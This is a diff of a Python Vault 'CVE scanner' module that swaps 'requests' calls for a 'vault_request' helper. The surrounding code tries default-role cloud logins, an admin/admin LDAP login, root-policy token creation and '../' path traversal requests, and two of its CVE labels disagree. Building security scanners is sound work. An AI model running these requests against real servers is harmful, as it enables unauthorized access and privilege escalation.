@@ -1,5 +1,5 @@
 from typing import Optional, Dict, List
-import requests
+from core.tls_config import vault_request
 import json
 import os
 from ..context import ExecutionContext
@@ -95,7 +95,7 @@ class CVEScannerModule(BaseExecutionModule):
 
     def _get_vault_version(self, target) -> Optional[str]:
         try:
-            resp = requests.get(f"{target}/v1/sys/health", timeout=5)
+            resp = vault_request("GET", f"{target}/v1/sys/health", timeout=5)
             if resp.status_code == 200:
                 return resp.json().get("version")
         except:
@@ -275,7 +275,7 @@ class CVEScannerModule(BaseExecutionModule):
             # Kubernetes auth mount'larını bul
             headers = {"X-Vault-Token": token} if token else {}
             url = f"{target}/v1/sys/mounts"
-            resp = requests.get(url, headers=headers, timeout=5)
+            resp = vault_request("GET", url, headers=headers, timeout=5)
             if resp.status_code != 200:
                 return {"success": False, "error": "Mount'lar listelenemedi"}
             mounts = resp.json().get("data", {})
@@ -286,7 +286,7 @@ class CVEScannerModule(BaseExecutionModule):
             # Login dene
             login_url = f"{target}/v1/auth/{k8s_mounts[0].strip('/')}/login"
             payload = {"jwt": jwt, "role": "default"}
-            resp = requests.post(login_url, json=payload, timeout=5)
+            resp = vault_request("POST", login_url, json=payload, timeout=5)
             if resp.status_code == 200:
                 data = resp.json()
                 new_token = data.get("auth", {}).get("client_token")
@@ -302,7 +302,7 @@ class CVEScannerModule(BaseExecutionModule):
         try:
             url = f"{target}/v1/sys/mounts"
             headers = {"X-Vault-Token": token} if token else {}
-            resp = requests.get(url, headers=headers, timeout=5)
+            resp = vault_request("GET", url, headers=headers, timeout=5)
             if resp.status_code != 200:
                 return {"success": False, "error": "Mount'lar listelenemedi"}
             mounts = resp.json().get("data", {})
@@ -313,7 +313,7 @@ class CVEScannerModule(BaseExecutionModule):
             # Azure login dene (varsayılan)
             login_url = f"{target}/v1/auth/{azure_mounts[0].strip('/')}/login"
             payload = {"role": "default"}
-            resp = requests.post(login_url, json=payload, timeout=5)
+            resp = vault_request("POST", login_url, json=payload, timeout=5)
             if resp.status_code == 200:
                 data = resp.json()
                 new_token = data.get("auth", {}).get("client_token")
@@ -329,7 +329,7 @@ class CVEScannerModule(BaseExecutionModule):
         try:
             url = f"{target}/v1/sys/mounts"
             headers = {"X-Vault-Token": token} if token else {}
-            resp = requests.get(url, headers=headers, timeout=5)
+            resp = vault_request("GET", url, headers=headers, timeout=5)
             if resp.status_code != 200:
                 return {"success": False, "error": "Mount'lar listelenemedi"}
             mounts = resp.json().get("data", {})
@@ -340,7 +340,7 @@ class CVEScannerModule(BaseExecutionModule):
             # GCP login dene
             login_url = f"{target}/v1/auth/{gcp_mounts[0].strip('/')}/login"
             payload = {"role": "default"}
-            resp = requests.post(login_url, json=payload, timeout=5)
+            resp = vault_request("POST", login_url, json=payload, timeout=5)
             if resp.status_code == 200:
                 data = resp.json()
                 new_token = data.get("auth", {}).get("client_token")
@@ -356,7 +356,7 @@ class CVEScannerModule(BaseExecutionModule):
         try:
             url = f"{target}/v1/sys/mounts"
             headers = {"X-Vault-Token": token} if token else {}
-            resp = requests.get(url, headers=headers, timeout=5)
+            resp = vault_request("GET", url, headers=headers, timeout=5)
             if resp.status_code != 200:
                 return {"success": False, "error": "Mount'lar listelenemedi"}
             mounts = resp.json().get("data", {})
@@ -366,7 +366,7 @@ class CVEScannerModule(BaseExecutionModule):
 
             login_url = f"{target}/v1/auth/{ldap_mounts[0].strip('/')}/login/admin"
             payload = {"password": "admin"}
-            resp = requests.post(login_url, json=payload, timeout=5)
+            resp = vault_request("POST", login_url, json=payload, timeout=5)
             if resp.status_code == 200:
                 data = resp.json()
                 new_token = data.get("auth", {}).get("client_token")
@@ -387,7 +387,7 @@ class CVEScannerModule(BaseExecutionModule):
             headers = {"X-Vault-Token": token} if token else {}
             url = f"{target}/v1/auth/token/create"
             payload = {"policies": ["root"], "ttl": "1h"}
-            resp = requests.post(url, headers=headers, json=payload, timeout=5)
+            resp = vault_request("POST", url, headers=headers, json=payload, timeout=5)
             if resp.status_code == 200:
                 data = resp.json()
                 new_token = data.get("auth", {}).get("client_token")
@@ -430,7 +430,7 @@ class CVEScannerModule(BaseExecutionModule):
         """CVE-2020-25876 - Path traversal"""
         try:
             url = f"{target}/v1/sys/internal/ui/mounts"
-            resp = requests.get(url, timeout=5)
+            resp = vault_request("GET", url, timeout=5)
             if resp.status_code == 200:
                 data = resp.json()
                 context.add_finding(
@@ -452,7 +452,7 @@ class CVEScannerModule(BaseExecutionModule):
                 f"{target}/ui/../../../vault.db",
             ]
             for url in urls:
-                resp = requests.get(url, timeout=5)
+                resp = vault_request("GET", url, timeout=5)
                 if resp.status_code == 200 and len(resp.text) > 100:
                     context.add_finding(
                         title="HIGH: CVE-2020-25467 UI Path Traversal",
